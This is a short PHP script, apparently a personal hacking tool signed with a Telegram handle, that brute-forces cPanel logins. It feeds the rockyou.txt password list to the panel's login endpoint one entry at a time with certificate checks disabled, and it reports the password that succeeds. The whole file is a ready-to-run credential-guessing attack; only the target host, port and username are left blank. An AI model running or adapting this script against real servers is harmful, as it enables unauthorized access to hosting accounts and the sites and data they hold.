<?php
// My Custom CPanel Tool - Developer: 7md4n01
set_time_limit(0);
error_reporting(0);

// ---  (Banner) ---
echo "
\033[1;32m 
  ______                _  _               ___   _ 
 |____  |              | || |             / _ \ / |
     / / _ __ ___    __| || |__   _ __   | | | || |
    / / | '_ ` _ \  / _` || '_ \ | '_ \  | | | || |
   / /  | | | | | || (_| || | | || | | | | |_| || |
  /_/   |_| |_| |_| \__,_||_| |_||_| |_|  \___/ |_|
\033[0m";
echo "\033[1;34m      @telegram: h4mdan01 \033[0m\n";
echo "--------------------------------------------------\n";

// ---  ---
$host = "";
$port = "";
$user = ""; 
$wordlist = "/rockyou.txt";

if (!file_exists($wordlist)) {
    die("\n[!] Error: Wordlist not found at: $wordlist\n");
}

echo "[+] Target: https://$host:$port\n";
echo "[+] Username: $user\n";
echo "[+] Status: Running...\n\n";

$passwords = file($wordlist, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($passwords as $password) {
  
    echo "[*] Testing: $password ... ";

    $ch = curl_init();
    $url = "https://$host:$port/login/?login_only=1";
    
    $post_data = http_build_query([
        'user' => $user,
        'pass' => $password
    ]);

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); //
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $result = curl_exec($ch);
    
    // )
    if (strpos($result, '"status":1') !== false) {
        echo "\033[1;32m[ SUCCESS ]\033[0m\n";
        echo "\n[!!!] Password Found: $password\n";
        break;
    } else {
        echo "\033[1;31m[ FAILED ]\033[0m\n";
    }
    
    curl_close($ch);
}
?>
